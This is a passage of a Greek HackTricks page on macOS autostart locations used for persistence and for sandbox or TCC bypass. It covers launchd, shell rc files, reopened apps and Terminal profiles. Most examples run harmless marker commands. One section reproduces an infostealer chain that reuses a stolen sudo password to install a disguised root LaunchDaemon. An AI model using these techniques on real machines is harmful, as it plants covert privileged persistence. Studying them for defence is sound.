# Αυτόματη εκκίνηση macOS

{{#include ../banners/hacktricks-training.md}}

Αυτή η ενότητα βασίζεται σε μεγάλο βαθμό στη σειρά αναρτήσεων [**Πέρα από τα παλιά καλά LaunchAgents**](https://theevilbit.github.io/beyond/). Στόχος της είναι να εντοπίσει τοποθεσίες όπου η εγγραφή ενός αρχείου μπορεί να οδηγήσει σε μεταγενέστερη εκτέλεση κώδικα, το συμβάν που πυροδοτεί την εκτέλεση και τα απαιτούμενα δικαιώματα. Η παρουσία μιας τοποθεσίας δεν αποδεικνύει ότι ο μηχανισμός είναι ενεργοποιημένος. Οι τοπικοί έλεγχοι που αναφέρονται παρακάτω πραγματοποιήθηκαν σε macOS 26.5.2 (5 Οκτωβρίου 2026)· δεν τεκμηριώνουν τη συμπεριφορά σε κάθε έκδοση macOS.

> [!NOTE]
> Η «ενεργοποίηση μέσω εγγραφής» δεν σημαίνει πάντα ότι «εκτελείται αμέσως μετά την εγγραφή». Ορισμένες τοποθεσίες διαβάζονται μόνο κατά τη σύνδεση, όταν ξεκινά μια συγκεκριμένη εφαρμογή ή όταν ο χρήστης εκτελεί μια ενέργεια. Ένα payload με δυνατότητα εγγραφής μέσα σε μια ήδη διαμορφωμένη εργασία διαφέρει επίσης από το δικαίωμα καταχώρισης μιας νέας εργασίας. Δοκιμάστε σε λογαριασμό ή VM που μπορείτε να διαθέσετε για αυτόν τον σκοπό προτού βασιστείτε σε μια τεχνική.

## Παράκαμψη sandbox

> [!TIP]
> Εδώ μπορείτε να βρείτε τοποθεσίες αυτόματης εκκίνησης χρήσιμες για **παράκαμψη του sandbox**, οι οποίες σας επιτρέπουν να εκτελέσετε κάτι απλώς **γράφοντάς το σε ένα αρχείο** και **περιμένοντας** μια πολύ **συνηθισμένη** **ενέργεια**, ένα καθορισμένο **χρονικό διάστημα** ή μια **ενέργεια που συνήθως μπορείτε να εκτελέσετε** μέσα από ένα sandbox χωρίς να χρειάζεστε δικαιώματα root.

### Launchd

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσίες

- **`/Library/LaunchAgents`**
  - **Trigger**: Σύνδεση χρήστη (ή ρητή καταχώριση)
  - Απαιτείται root
- **`/Library/LaunchDaemons`**
  - **Trigger**: Εκκίνηση συστήματος (ή ρητή καταχώριση)
  - Απαιτείται root
- **`/System/Library/LaunchAgents`**
  - **Trigger**: Σύνδεση χρήστη· προστατευμένη τοποθεσία συστήματος της Apple
- **`/System/Library/LaunchDaemons`**
  - **Trigger**: Εκκίνηση συστήματος· προστατευμένη τοποθεσία συστήματος της Apple
- **`~/Library/LaunchAgents`**
  - **Trigger**: Επανασύνδεση

Δεν υπάρχει τοποθεσία `~/Library/LaunchDaemons` που να σαρώνει το `launchd`. Οι εργασίες ανά χρήστη ανήκουν στο `~/Library/LaunchAgents`· ο κατάλογος των daemons συστήματος είναι το `/Library/LaunchDaemons`. Ο [οδηγός εκκίνησης του launchd της Apple](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html) περιγράφει τις τοποθεσίες που σαρώνονται.

> [!TIP]
> Ενδιαφέρον είναι ότι το **`launchd`** περιέχει ενσωματωμένο property list στην ενότητα Mach-O `__Text.__config`, η οποία περιλαμβάνει άλλες γνωστές υπηρεσίες που πρέπει να εκκινήσει το launchd. Επιπλέον, αυτές οι υπηρεσίες μπορούν να περιέχουν τα `RequireSuccess`, `RequireRun` και `RebootOnSuccess`, που σημαίνουν ότι πρέπει να εκτελεστούν και να ολοκληρωθούν με επιτυχία.
>
> Φυσικά, δεν μπορεί να τροποποιηθεί λόγω code signing.

#### Περιγραφή & Εκμετάλλευση

Το **`launchd`** είναι η **πρώτη** **διεργασία** που εκτελείται από τον πυρήνα του macOS κατά την εκκίνηση και η τελευταία που τερματίζεται κατά τον τερματισμό λειτουργίας. Θα πρέπει να έχει πάντα **PID 1**. Αυτή η διεργασία θα **διαβάσει και θα εκτελέσει** τις διαμορφώσεις που υποδεικνύονται στα **ASEP** **plists** στις εξής τοποθεσίες:

- `/Library/LaunchAgents`: Agents ανά χρήστη που εγκαθίστανται από τον διαχειριστή
- `/Library/LaunchDaemons`: Daemons σε επίπεδο συστήματος που εγκαθίστανται από τον διαχειριστή
- `/System/Library/LaunchAgents`: Agents ανά χρήστη που παρέχονται από την Apple.
- `/System/Library/LaunchDaemons`: Daemons σε επίπεδο συστήματος που παρέχονται από την Apple.

Όταν ένας χρήστης συνδέεται, το `launchd` φορτώνει τα plists από το `~/Library/LaunchAgents` του συγκεκριμένου χρήστη, με τα δικαιώματα αυτού του χρήστη. Οι εργασίες ξεκινούν σύμφωνα με τα κλειδιά τους· η απλή φόρτωση ενός plist δεν συνεπάγεται άμεση εκτέλεση διεργασίας.

Η **κύρια διαφορά μεταξύ agents και daemons είναι ότι οι agents φορτώνονται όταν συνδέεται ο χρήστης, ενώ οι daemons φορτώνονται κατά την εκκίνηση του συστήματος** (καθώς υπάρχουν υπηρεσίες όπως το ssh που πρέπει να εκτελούνται πριν αποκτήσει πρόσβαση οποιοσδήποτε χρήστης στο σύστημα). Επίσης, οι agents μπορούν να χρησιμοποιούν GUI, ενώ οι daemons πρέπει να εκτελούνται στο παρασκήνιο.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
        <string>com.apple.someidentifier</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/sh</string>
        <string>-c</string>
        <string>touch /tmp/launched</string>
    </array>
    <key>RunAtLoad</key><true/> <!--Execute at system startup-->
    <key>StartInterval</key>
    <integer>800</integer> <!--Execute each 800s-->
    <key>KeepAlive</key>
    <dict>
        <key>SuccessfulExit</key><false/> <!--Re-execute if exit unsuccessful-->
        <!--If previous is true, then re-execute in successful exit-->
    </dict>
</dict>
</plist>
```

Κάθε στοιχείο του `ProgramArguments` είναι ξεχωριστό όρισμα· το `launchd` δεν αναλύει μία συμβολοσειρά ως εντολή κελύφους. Το διορθωμένο παράδειγμα παραπάνω μπορεί να ελεγχθεί συντακτικά χωρίς να φορτωθεί, με την εντολή `plutil -lint /path/to/example.plist`. Ανατρέξτε στην τοπική καταχώριση `man launchd.plist` για τα `ProgramArguments`, `RunAtLoad` και `KeepAlive`.

#### Ενεργοποιητές συμβάντων αρχείων σε υπάρχουσες εργασίες

Ένας **ήδη φορτωμένος** agent ή daemon μπορεί να χρησιμοποιεί το `WatchPaths` για να εκκινείται όταν αλλάζει μια καθορισμένη διαδρομή. Το `QueueDirectories` εκκινεί μια εργασία όσο ένας κατάλογος δεν είναι κενός· το `StartOnMount` την εκκινεί κατά την προσάρτηση ενός τόμου. Ο [οδηγός της Apple για το launchd](https://developer.apple.com/library/archive/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/CreatingLaunchdJobs.html#//apple_ref/doc/uid/10000172i-CH2-SW9) περιλαμβάνει παραδείγματα για τα `WatchPaths` και `QueueDirectories`. Μια εγγραφή σε ένα αρχείο που παρακολουθείται ενεργοποιεί την **ήδη διαμορφωμένη εργασία**· παρέχει αυθαίρετη εκτέλεση κώδικα μόνο αν αυτός που γράφει μπορεί επίσης να ελέγξει το εκτελέσιμο αρχείο, το script ή τα δεδομένα που ερμηνεύει η εργασία. Η απλή εγγραφή ενός νέου plist εκτός μιας τοποθεσίας που σαρώνεται ή έχει καταχωριστεί δεν το φορτώνει.

Αυτό το PoC αυτοκαθαρισμού καταχωρίζει έναν **προσωρινό user agent** με μοναδικό όνομα, τροποποιεί μόνο το δικό του αρχείο που παρακολουθείται και αφαιρεί τον agent. Εκτελέστηκε με επιτυχία στο macOS 26.5.2 χωρίς αποσύνδεση ή επανεκκίνηση:

```python
import os, pathlib, plistlib, subprocess, tempfile, time, uuid

label = f"org.hacktricks.watchtest.{uuid.uuid4().hex}"
target = f"gui/{os.getuid()}"
with tempfile.TemporaryDirectory(prefix="ht-watch-") as root:
    base = pathlib.Path(root)
    watched, marker, plist = base / "watched", base / "ran", base / "agent.plist"
    watched.write_text("before\n")
    plist.write_bytes(plistlib.dumps({
        "Label": label,
        "ProgramArguments": ["/usr/bin/touch", str(marker)],
        "WatchPaths": [str(watched)],
        "RunAtLoad": False,
    }))
    subprocess.run(["launchctl", "bootstrap", target, str(plist)], check=True)
    try:
        marker.unlink(missing_ok=True)
        watched.write_text("after\n")
        for _ in range(30):
            if marker.exists():
                break
            time.sleep(0.1)
        print("watch fired:", marker.exists())
    finally:
        subprocess.run(["launchctl", "bootout", f"{target}/{label}"], check=True)
```

Η τοπική εκτέλεση εμφάνισε `watch fired: True` και το `bootout` ολοκληρώθηκε με επιτυχία. Το `launchctl bootstrap` χρησιμοποιείται εδώ μόνο μέσα στο απομονωμένο PoC· **δεν** χρειάζεται για ένα job που έχει ήδη φορτωθεί. Για να αξιολογήσετε με ασφάλεια ένα υπάρχον job, διαβάστε το plist και τη διαδρομή `ProgramArguments` που έχει επιλυθεί και, στη συνέχεια, ελέγξτε αν το σχετικό εκτελέσιμο αρχείο ή το αρχείο που ερμηνεύεται είναι εγγράψιμο, χωρίς να το τροποποιήσετε.

Υπάρχουν περιπτώσεις όπου ένας **agent πρέπει να εκτελεστεί πριν συνδεθεί ο χρήστης**· αυτοί ονομάζονται **PreLoginAgents**. Για παράδειγμα, αυτό είναι χρήσιμο για την παροχή assistive technology κατά τη σύνδεση. Μπορούν επίσης να βρεθούν στο `/Library/LaunchAgents` (δείτε [**εδώ**](https://github.com/HelmutJ/CocoaSampleCode/tree/master/PreLoginAgents) ένα παράδειγμα).

> [!TIP]
> Τα αρχεία ρυθμίσεων νέων Daemons ή Agents θα **φορτωθούν μετά την επόμενη επανεκκίνηση ή με τη χρήση της** `launchctl load <target.plist>`. Είναι **επίσης δυνατό να φορτωθούν αρχεία .plist χωρίς αυτήν την επέκταση** με `launchctl -F <file>` (ωστόσο, αυτά τα αρχεία plist δεν θα φορτωθούν αυτόματα μετά την επανεκκίνηση).\
> Είναι επίσης δυνατό να γίνει **unload** με `launchctl unload <target.plist>` (η διεργασία που υποδεικνύεται από αυτό θα τερματιστεί),
>
> Για να **βεβαιωθείτε** ότι δεν υπάρχει **τίποτα** (όπως μια παράκαμψη) που **εμποδίζει** την **εκτέλεση** ενός **Agent** ή **Daemon**, εκτελέστε: `sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.smdb.plist`

Εμφανίστε όλους τους agents και daemons που έχουν φορτωθεί από τον τρέχοντα χρήστη:

```bash
launchctl list
```

#### Παράδειγμα κακόβουλης αλυσίδας LaunchDaemon (επαναχρησιμοποίηση κωδικού πρόσβασης)

Ένα πρόσφατο macOS infostealer επαναχρησιμοποίησε έναν **υποκλαπέντα κωδικό πρόσβασης sudo** για να εγκαταστήσει έναν user agent και ένα root LaunchDaemon:<sup>[[1]](#references)</sup>

- Εγγράψτε τον βρόχο του agent στο `~/.agent` και κάντε τον εκτελέσιμο.
- Δημιουργήστε ένα plist στο `/tmp/starter` που δείχνει σε αυτόν τον agent.
- Επαναχρησιμοποιήστε τον κλεμμένο κωδικό πρόσβασης με `sudo -S` για να τον αντιγράψετε στο `/Library/LaunchDaemons/com.finder.helper.plist`, να ορίσετε `root:wheel` και να τον φορτώσετε με `launchctl load`.
- Εκκινήστε τον agent αθόρυβα μέσω `nohup ~/.agent >/dev/null 2>&1 &` για να αποσυνδέσετε την έξοδο.

```bash
printf '%s\n' "$pw" | sudo -S cp /tmp/starter /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S chown root:wheel /Library/LaunchDaemons/com.finder.helper.plist
printf '%s\n' "$pw" | sudo -S launchctl load /Library/LaunchDaemons/com.finder.helper.plist
nohup "$HOME/.agent" >/dev/null 2>&1 &
```
> [!WARNING]
> Ένα plist daemon που τοποθετείται στο `/Library/LaunchDaemons` δεν γίνεται ασφαλές αν του δοθεί ιδιοκτησία χρήστη. Το `launchd` απαιτεί κατάλληλη ιδιοκτησία και δικαιώματα για τις εργασίες συστήματος και μπορεί να απορρίψει ένα μη ασφαλές plist. Ένα daemon που ανήκει στον root εκτελείται κανονικά ως root, εκτός αν η διαμόρφωσή του επιλέγει άλλον λογαριασμό. Ελέγξτε τα `UserName`, `GroupName`, την ιδιοκτησία και τα διαγνωστικά του `launchctl`. Μην συμπεραίνετε την ταυτότητα εκτέλεσης μόνο από το όνομα του ιδιοκτήτη του plist.

#### Περισσότερες πληροφορίες για το launchd

Το **`launchd`** είναι η **πρώτη** διεργασία σε user mode που ξεκινά από τον **kernel**. Η εκκίνηση της διεργασίας πρέπει να είναι **επιτυχής** και αυτή **δεν μπορεί να τερματιστεί ή να καταρρεύσει**. Είναι ακόμη και **προστατευμένη** από ορισμένα **σήματα τερματισμού**.

Ένα από τα πρώτα πράγματα που κάνει το `launchd` είναι να **ξεκινά** όλα τα **daemons**, όπως:

- **Timer daemons** που βασίζονται στον χρόνο εκτέλεσης:
  - Το `com.apple.atrun.plist` καλεί το `/usr/libexec/atrun` με `StartInterval = 30` δευτερόλεπτα στο macOS 26.5.2· η πραγματική κατάσταση ενεργοποίησής του μπορεί να διαφέρει από το κλειδί `Disabled` του plist, επειδή το launchd διατηρεί τις παρακάμψεις ξεχωριστά.
  - Το `com.vix.cron.plist` καλεί το `/usr/sbin/cron` όταν ο κατάλογος `/usr/lib/cron/tabs` περιέχει εργασίες. Το `com.apple.systemstats.daily` είναι διαφορετική προγραμματισμένη υπηρεσία, όχι το cron daemon.
- **Network daemons**, όπως:
  - `org.cups.cups-lpd`: Ακούει μέσω TCP (`SockType: stream`) με `SockServiceName: printer`
    - Το SockServiceName πρέπει να είναι είτε θύρα είτε υπηρεσία από το `/etc/services`
  - `com.apple.xscertd.plist`: Ακούει μέσω TCP στη θύρα 1640
- **Path daemons** που εκτελούνται όταν αλλάζει μια καθορισμένη διαδρομή:
  - `com.apple.postfix.master`: Ελέγχει τη διαδρομή `/etc/postfix/aliases`
- **IOKit notifications daemons**:
  - `com.apple.xartstorageremoted`: `"com.apple.iokit.matching" => { "com.apple.device-attach" => { "IOMatchLaunchStream" => 1 ...`
- **Mach port:**
  - `com.apple.xscertd-helper.plist`: Η καταχώριση `MachServices` υποδεικνύει το όνομα `com.apple.xscertd.helper`
- **UserEventAgent:**
  - Διαφέρει από το προηγούμενο. Κάνει το launchd να εκκινεί εφαρμογές ως απόκριση σε συγκεκριμένα συμβάντα. Ωστόσο, σε αυτή την περίπτωση, το κύριο binary που εμπλέκεται δεν είναι το `launchd`, αλλά το `/usr/libexec/UserEventAgent`. Φορτώνει plugins από τον φάκελο SIP restricted `/System/Library/UserEventPlugins/`, όπου κάθε plugin δηλώνει τον αρχικοποιητή του στο κλειδί `XPCEventModuleInitializer` ή, στην περίπτωση παλαιότερων plugins, στο dict `CFPluginFactories` κάτω από το κλειδί `FB86416D-6164-2070-726F-70735C216EC0` του `Info.plist`.

### αρχεία εκκίνησης shell

Αναλυτικό άρθρο: [https://theevilbit.github.io/beyond/beyond_0001/](https://theevilbit.github.io/beyond/beyond_0001/)<sup>[[2]](#references)</sup>\
Αναλυτικό άρθρο (xterm): [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC Bypass: [✅](https://emojipedia.org/check-mark-button)
  - Αλλά χρειάζεται να βρείτε μια εφαρμογή με TCC bypass που εκτελεί ένα shell το οποίο φορτώνει αυτά τα αρχεία

#### Τοποθεσίες

- **`~/.zshenv`** (ή ένα νεότερο μεταγλωττισμένο **`~/.zshenv.zwc`**)
  - **Ενεργοποίηση**: Κάθε συνηθισμένη κλήση του zsh, συμπεριλαμβανομένου του μη διαδραστικού `zsh -c`· το `zsh -f` παραλείπει τα αρχεία εκκίνησης χρήστη.
- **`~/.zshrc`**
  - **Ενεργοποίηση**: Ξεκινά διαδραστικό zsh.
- **`~/.zprofile`, `~/.zlogin`**
  - **Ενεργοποίηση**: Ξεκινά zsh σύνδεσης· αυτά διαβάζονται πριν και μετά το `.zshrc`, αντίστοιχα.
- **`/etc/zshenv`, `/etc/zprofile`, `/etc/zshrc`, `/etc/zlogin`**
  - **Ενεργοποίηση**: Ανοίξτε ένα terminal με zsh
  - Απαιτείται root
- **`~/.zlogout`**
  - **Ενεργοποίηση**: Ένα zsh σύνδεσης τερματίζεται κανονικά· όχι σε κάθε έξοδο από terminal ή shell.
- **`/etc/zlogout`**
  - **Ενεργοποίηση**: Τερματίστε ένα terminal με zsh
  - Απαιτείται root
- Ενδεχομένως υπάρχουν περισσότερα στο: **`man zsh`**
- **`~/.bashrc`**
  - **Ενεργοποίηση**: Εκκινήστε διαδραστικό **non-login** Bash. Ένα διαδραστικό login Bash το διαβάζει μόνο αν ένα αρχείο σύνδεσης κάνει ρητά source αυτό το αρχείο.
- **`~/.bash_profile`, `~/.bash_login`, `~/.profile`**
  - **Ενεργοποίηση**: Εκκινήστε login Bash· εκτελείται το πρώτο αναγνώσιμο αρχείο με αυτή τη σειρά. Το `~/.profile` παραλείπεται αν υπάρχει οποιοδήποτε από τα δύο προηγούμενα αρχεία.
- **`/etc/profile`**
  - **Ενεργοποίηση**: Εκκινήστε login Bash· η τροποποίησή του απαιτεί root.
- **`~/.tcshrc`** ή, αν απουσιάζει, **`~/.cshrc`**
  - **Ενεργοποίηση**: Εκκινήστε `tcsh`, ακόμη και μη διαδραστικό `tcsh -c` σε αυτό το Mac. Ο χρήστης πρέπει πράγματι να εκκινήσει το `tcsh`· δεν είναι το προεπιλεγμένο shell του macOS.
- **`~/.login`**
  - **Ενεργοποίηση**: Εκκινήστε login `tcsh` μετά το αρχείο rc του.
- `~/.xinitrc`, `~/.xserverrc`, `/opt/X11/etc/X11/xinit/xinitrc.d/`
  - **Ενεργοποίηση**: Αναμένεται να ενεργοποιούνται με το xterm, αλλά αυτό **δεν είναι εγκατεστημένο** και, ακόμη και μετά την εγκατάστασή του, εμφανίζεται αυτό το σφάλμα: xterm: `DISPLAY is not set`<sup>[[3]](#references)</sup>

#### Περιγραφή & Exploitation

Κατά την εκκίνηση ενός περιβάλλοντος shell, όπως το `zsh` ή το `bash`, **εκτελούνται ορισμένα αρχεία εκκίνησης**. Το macOS χρησιμοποιεί αυτή τη στιγμή το `/bin/zsh` ως προεπιλεγμένο shell. Το αν το Terminal ή το SSH ξεκινούν login ή διαδραστικό shell εξαρτάται από τη διαμόρφωσή τους· μην υποθέτετε ότι εκτελείται κάθε αρχείο που αναφέρεται παραπάνω σε κάθε συνεδρία. Παρόλο που τα `bash` και `sh` υπάρχουν επίσης στο macOS, πρέπει να εκκινηθούν ρητά για να χρησιμοποιηθούν.<sup>[[2]](#references)</sup> Η [αναφορά αρχείων εκκίνησης zsh](https://zsh.sourceforge.io/Doc/Release/Files.html) προσδιορίζει τη σειρά, την παράκαμψη `ZDOTDIR` και τον κανόνα `.zwc`.

Το ακόλουθο πείραμα μόνο για ανάγνωση χρησιμοποίησε ένα προσωρινό `ZDOTDIR` στο macOS 26.5.2. Δείχνει ποια αρχεία χρήστη διαβάστηκαν· δεν τροποποιήθηκε κανένα πραγματικό αρχείο εκκίνησης shell:

```bash
lab=$(mktemp -d)
for name in zshenv zprofile zshrc zlogin zlogout; do
  printf 'print -r -- %s >> "$ZDOTDIR/seen"\n' "$name" > "$lab/.$name"
done
for flags in -c -ic -lc -lic; do
  : > "$lab/seen"
  ZDOTDIR="$lab" /bin/zsh "$flags" ':'
  printf '%s: %s\n' "$flags" "$(tr '\n' ' ' < "$lab/seen")"
done
rm -r "$lab"
```

Η σειρά που παρατηρήθηκε ήταν `-c`: `zshenv`; `-ic`: `zshenv zshrc`; `-lc`: `zshenv zprofile zlogin`; `-lic`: `zshenv zprofile zshrc zlogin zlogout`. Το `ZDOTDIR` πρέπει να δείχνει ήδη στον εναλλακτικό κατάλογο· δεν αρκεί να γράψετε αρχεία σε έναν αυθαίρετο κατάλογο.

Η [αναφορά εκκίνησης του Bash](https://www.gnu.org/software/bash/manual/html_node/Bash-Startup-Files.html) διακρίνει τα login shells από τα interactive shells. Στο δοκιμαστικό μηχάνημα με macOS 26.5.2, ένα απομονωμένο `HOME` που περιείχε και τα τέσσερα αρχεία εκκίνησης χρήστη παρήγαγε τα εξής: `bash -c` → κανένα, `bash -ic` → `.bashrc`, `bash -lc` και `bash -lic` → μόνο `.bash_profile`. Όταν αφαιρέθηκε το `.bash_profile`, το login Bash διάβασε το `.bash_login` και, όταν αφαιρέθηκε κι αυτό, το `.profile`. Το `BASH_ENV` μπορεί να υποδείξει στο noninteractive Bash ένα αρχείο, αλλά αυτή η μεταβλητή περιβάλλοντος πρέπει να είναι ήδη ορισμένη στη διεργασία που το εκκινεί. Μια ρητή εντολή `exit` από login Bash μπορεί επίσης να φορτώσει το `~/.bash_logout`.

Το τοπικό εγχειρίδιο `tcsh(1)` περιγράφει τη δική του, ξεχωριστή σειρά εκκίνησης. Με ένα προσωρινό `HOME`, το `/bin/tcsh -c :` διάβασε το `.tcshrc` ή το `.cshrc` όταν απουσίαζε το `.tcshrc`. Ένα προσωρινό login `tcsh` διάβασε τα `.tcshrc` και `.login`. Σε αυτούς τους ελέγχους δημιουργήθηκαν και αφαιρέθηκαν μόνο προσωρινά αρχεία.

### Εφαρμογές που ανοίγουν ξανά

> [!CAUTION]
> Στις δοκιμές, η ρύθμιση των υποδεικνυόμενων και η αποσύνδεση και επανασύνδεση, ή ακόμη και η επανεκκίνηση, δεν εκτέλεσαν την εφαρμογή. Ίσως χρειάζεται η εφαρμογή να εκτελείται τη στιγμή που πραγματοποιούνται αυτές οι ενέργειες.

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0021/](https://theevilbit.github.io/beyond/beyond_0021/)<sup>[[4]](#references)</sup>

- Χρήσιμο για παράκαμψη sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Τοποθεσία

- **`~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`**
  - **Trigger**: Επανεκκίνηση που ανοίγει ξανά εφαρμογές

#### Περιγραφή & Exploitation

Όλες οι εφαρμογές που θα ανοίξουν ξανά βρίσκονται μέσα στο plist `~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist`<sup>[[4]](#references)</sup>

Επομένως, για να κάνετε τις εφαρμογές που ανοίγουν ξανά να εκκινήσουν τη δική σας εφαρμογή, αρκεί να **προσθέσετε την εφαρμογή σας στη λίστα**.

Μπορείτε να βρείτε το UUID καταγράφοντας τα περιεχόμενα αυτού του καταλόγου ή με την εντολή `ioreg -rd1 -c IOPlatformExpertDevice | awk -F'"' '/IOPlatformUUID/{print $4}'`

Για να ελέγξετε ποιες εφαρμογές θα ανοίξουν ξανά, μπορείτε να εκτελέσετε:

```bash
defaults -currentHost read com.apple.loginwindow TALAppsToRelaunchAtLogin
#or
plutil -p ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

Για να **προσθέσετε μια εφαρμογή σε αυτή τη λίστα** μπορείτε να χρησιμοποιήσετε:

```bash
# Adding iTerm2
/usr/libexec/PlistBuddy -c "Add :TALAppsToRelaunchAtLogin: dict" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BackgroundState 2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:BundleID com.googlecode.iterm2" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Hide 0" \
    -c "Set :TALAppsToRelaunchAtLogin:$:Path /Applications/iTerm.app" \
    ~/Library/Preferences/ByHost/com.apple.loginwindow.<UUID>.plist
```

### Προτιμήσεις Terminal

Writeup: [https://theevilbit.github.io/beyond/beyond_0020/](https://theevilbit.github.io/beyond/beyond_0020/)<sup>[[5]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- TCC bypass: [✅](https://emojipedia.org/check-mark-button)
  - Το Terminal χρησιμοποιεί τα FDA permissions του χρήστη που το χρησιμοποιεί

#### Τοποθεσία

- **`~/Library/Preferences/com.apple.Terminal.plist`**
  - **Ενεργοποίηση**: Άνοιγμα νέου παραθύρου ή καρτέλας Terminal με το profile του οποίου οι ρυθμίσεις Shell περιέχουν την εντολή εκκίνησης

#### Περιγραφή και εκμετάλλευση

Στο **`~/Library/Preferences`** αποθηκεύονται οι προτιμήσεις του χρήστη για τις εφαρμογές. Ορισμένες από αυτές τις προτιμήσεις μπορούν να περιέχουν ρυθμίσεις για **εκτέλεση άλλων εφαρμογών/scripts**.<sup>[[5]](#references)</sup>

Για παράδειγμα, το Terminal μπορεί να εκτελέσει μια εντολή κατά την εκκίνηση:

<figure><img src="../images/image (1148).png" alt="" width="495"><figcaption></figcaption></figure>

Αυτή η ρύθμιση αποτυπώνεται στο αρχείο **`~/Library/Preferences/com.apple.Terminal.plist`** ως εξής:

```bash
[...]
"Window Settings" => {
    "Basic" => {
      "CommandString" => "touch /tmp/terminal_pwn"
      "Font" => {length = 267, bytes = 0x62706c69 73743030 d4010203 04050607 ... 00000000 000000cf }
      "FontAntialias" => 1
      "FontWidthSpacing" => 1.004032258064516
      "name" => "Basic"
      "ProfileCurrentVersion" => 2.07
      "RunCommandAsShell" => 0
      "type" => "Window Settings"
    }
[...]
```

Αν το σχετικό προφίλ περιέχει μια εντολή εκκίνησης και το Terminal διαβάσει αυτήν την προτίμηση, μια νέα συνεδρία που χρησιμοποιεί αυτό το προφίλ μπορεί να την εκτελέσει. Ο [τρέχων οδηγός Terminal της Apple](https://support.apple.com/guide/terminal/trmlshll/mac) περιγράφει την εντολή **Shell → Startup** ανά προφίλ. Δεν αρκεί απλώς να ανοίξει το Terminal, χωρίς να ξεκινήσει νέα συνεδρία που χρησιμοποιεί αυτό το προφίλ. Οι αλλαγές προτιμήσεων παρακάτω **δεν** πραγματοποιήθηκαν στο Mac της έρευνας.

Μπορείτε να το προσθέσετε από το cli με:

```bash
# Add
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" 'touch /tmp/terminal-start-command'" $HOME/Library/Preferences/com.apple.Terminal.plist
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"RunCommandAsShell\" 0" $HOME/Library/Preferences/com.apple.Terminal.plist

# Remove
/usr/libexec/PlistBuddy -c "Set :\"Window Settings\":\"Basic\":\"CommandString\" ''" $HOME/Library/Preferences/com.apple.Terminal.plist
```

### Terminal Scripts / Άλλες επεκτάσεις αρχείων

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [✅](https://emojipedia.org/check-mark-button)
  - Το Terminal χρησιμοποιούνταν για να έχει τα δικαιώματα FDA του χρήστη

#### Τοποθεσία

- **Οπουδήποτε**
  - **Ενεργοποίηση**: Άνοιγμα του συγκεκριμένου αρχείου `.terminal`, `.command` ή `.tool`

#### Περιγραφή & Exploitation

Αν ένας χρήστης ανοίξει ένα αρχείο ρυθμίσεων **`.terminal`**, το Terminal μπορεί να δημιουργήσει μια συνεδρία από το προφίλ του· τα εκτελέσιμα αρχεία **`.command`** και **`.tool`** μπορούν επίσης να ανοίξουν στο Terminal. Αυτό απαιτεί ρητά το άνοιγμα του αρχείου και δεν ενεργοποιείται απλώς με το άνοιγμα του Terminal. Η πρόσβαση TCC που κληρονομείται εξαρτάται από τα δικαιώματα που έχει πράγματι παραχωρηθεί στο Terminal και από την ενέργεια που επιχειρείται. Το ιστορικό παράδειγμα παρακάτω δεν εκτελέστηκε στο Mac της έρευνας.

Δοκιμάστε το με:

```bash
# Prepare the payload
cat > /tmp/test.terminal << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>CommandString</key>
	<string>/usr/bin/touch /tmp/ht-terminal-file-marker</string>
	<key>ProfileCurrentVersion</key>
	<real>2.0600000000000001</real>
	<key>RunCommandAsShell</key>
	<false/>
	<key>name</key>
	<string>exploit</string>
	<key>type</key>
	<string>Window Settings</string>
</dict>
</plist>
EOF

# Trigger it
open /tmp/test.terminal

# After inspecting the marker, remove the disposable file and marker:
rm -f /tmp/test.terminal /tmp/ht-terminal-file-marker
```

You could also use the extensions **`.command`**, **`.tool`**, με περιεχόμενο κανονικών shell scripts, και θα ανοίγουν επίσης στο Terminal.

> [!CAUTION]
> Αν το terminal έχει **Full Disk Access**, θα μπορεί να ολοκληρώσει αυτή την ενέργεια (σημειώστε ότι η εντολή που εκτελείται θα είναι ορατή σε ένα παράθυρο terminal).

### Πρόσθετα ήχου

Writeup: [https://theevilbit.github.io/beyond/beyond_0013/](https://theevilbit.github.io/beyond/beyond_0013/)<sup>[[6]](#references)</sup>\
Writeup: [https://posts.specterops.io/audio-unit-plug-ins-896d3434a882](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)<sup>[[7]](#references)</sup>

- Χρήσιμο για παράκαμψη του sandbox: [✅](https://emojipedia.org/check-mark-button)
- Παράκαμψη TCC: [🟠](https://emojipedia.org/large-orange-circle)
  - Ενδέχεται να αποκτήσετε επιπλέον πρόσβαση TCC

#### Τοποθεσία

- **`/Library/Audio/Plug-Ins/HAL`**
  - Απαιτείται root
